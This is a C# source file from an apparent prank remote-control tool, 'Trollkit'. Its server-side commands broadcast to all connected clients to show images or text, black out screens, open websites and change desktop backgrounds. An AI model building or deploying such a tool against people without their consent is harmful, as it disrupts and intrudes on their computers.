using Microsoft.Win32;
using System;
using System.IO;
using System.Windows.Controls;
using System.Windows.Input;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;
using Trollkit_Library.ServerModules;
using static Trollkit_Library.ServerModules.Server;

namespace Trollkit_Library.ViewModels.Commands
{
    public class VisualCommands
    {
		private Server _server;
		private string handler;

		public ICommand DisplayImage { get { return new SendServerCommand(SendDisplayImage); } }
		public ICommand DisplayText { get { return new SendServerCommand(SendDisplayText); } }
		public ICommand TurnOffScreen { get { return new SendServerCommand(SendTurnOffScreen); } }
		public ICommand OpenSite { get { return new SendServerCommand(SendOpenSite); } }
		public ICommand PickBackgroundImage { get { return new SendServerCommand(SendPickBackgroundImage); } }
		public string BroadcastMessageText { get; set; }
		public string OpenUrlText { get; set; }

		public VisualCommands(Server server, string handler)
		{
			_server = server;
			this.handler = handler;

			BroadcastMessageText = "Dit is een bericht";
			OpenUrlText = "https://google.com";
		}	

		private void SendDisplayImage()
		{
			OpenFileDialog open = new OpenFileDialog();
			open.Filter = "Image Files(*.png; *.jpg; *.jpeg; *.gif;)|*.png; *.jpg; *.jpeg; *.gif;";
			open.Multiselect = false;
			open.Title = "Pick an image to send to the client";
			if (open.ShowDialog() == true)
			{
				byte[] bytes = File.ReadAllBytes(open.FileName);

				string base64 = Convert.ToBase64String(bytes);
				TransferCommandObject returnObject = new TransferCommandObject { Command = "ShowImage", Handler = handler, Value = base64 };
				_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
			}
		}

		private void SendDisplayText()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "TextBox", Handler = handler, Value = BroadcastMessageText };
			_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendTurnOffScreen()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "BlackScreen", Handler = handler, Value = "" };
			_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendOpenSite()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "OpenSite", Handler = handler, Value = OpenUrlText };
			_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
		}

		private void SendPickBackgroundImage()
		{
			OpenFileDialog open = new OpenFileDialog();
			open.Filter = "Image Files(*.png; *.jpg; *.jpeg;)|*.png; *.jpg; *.jpeg;";
			open.Multiselect = false;
			open.Title = "Pick an image to set as background in the client";
			if (open.ShowDialog() == true)
			{
				byte[] bytes = File.ReadAllBytes(open.FileName);

				string base64 = Convert.ToBase64String(bytes);

				TransferCommandObject returnObject = new TransferCommandObject { Command = "SetBackground", Handler = handler, Value = base64 };
				_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
			}
		}
	}
}
